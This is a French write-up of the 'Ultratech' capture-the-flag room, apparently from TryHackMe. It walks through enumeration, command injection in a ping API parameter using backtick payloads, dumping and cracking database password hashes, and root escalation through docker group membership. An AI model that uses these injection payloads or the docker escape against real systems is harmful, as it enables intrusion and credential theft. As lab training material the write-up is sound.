# Ultratech
Une room sympa mais très (trop ?) simple :)

# Info
On va vérifier la page robots.txt qui affiche bien souvent des informations utile !
```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```
Il y a un site map dans un fichier texte, on va le check:
```
/
/index.html
/what.html
/partners.html
```
La page /partners.html ouvre un page qui demande un login.
# Enumeration
## Nmap
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 03:57 EDT
Nmap scan report for 10.10.32.31
Host is up (0.040s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.53 seconds
```
## Gobuster
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.32.31:31331/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.32.31:31331/css/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.32.31:31331/js/]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.32.31:31331/javascript/]
/server-status        (Status: 403) [Size: 302]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

## RestAPI 
On vois avec Burpsuite que l'API envoi des ping vers lui-même:
```
GET /ping?ip=10.10.32.31 HTTP/1.1
[...]
```
Je vais tenter une injection de commande....

## Command Injection
Les commandes sont filtré mais je trouve comment bypass :

L'url suivante :
```
http://10.10.32.31:8081/ping?ip=127.0.0.1|`id`
```
Fonctionne et donne ce résultat :
```
ping: groups=1002(www): Temporary failure in name resolution 
```
C'est tronquer, mais ca fonctionne. Je trouve ainsi la base de données : **utech.db.sqlite**

On va essaye de la lire :
```
http://10.10.32.31:8081/ping?ip=127.0.0.1|`cat utech.db.sqlite`
```
```
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7******)Madmin0d0ea5111e3c1def594c1684e3******: Parameter string not correctly encoded 
```
Nous avons donc ici 2 hash.
```
r00tf357a0c52799563c7c7b76c1e7******
admin0d0ea5111e3c1def594c1684e3*****
```
Ils sont en MD5, les voici une fois crack :
```
admin : mr******
r00t : n******
```
En les testant sur la page partner on obtiens ce résultat :
```
Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```

# Exploit & post exploit ;)
On peux aller sur le FTP mais celui-ci est vide.
On peux se connecté en SSH seulement avec le compte de r00t.

L'user **r00t** fait parti du groupe **docker**
On va tenter une privesc via dockers.

Pour ce faire on va déjà lister les images :
```
r00t@ultratech-prod:/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        4 years ago         15.8MB
```
Ensuite on va démarrer un shell root sur notre image:
```
r00t@ultratech-prod:/tmp$ docker run -it -v /:/host/ 495d6437fc1e chroot /host/ bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@d2312f28b9a2:/#
```
Nous voila root. Le flag est la clé ssh qui ce trouve dans **/root/.ssh/id_rsa**
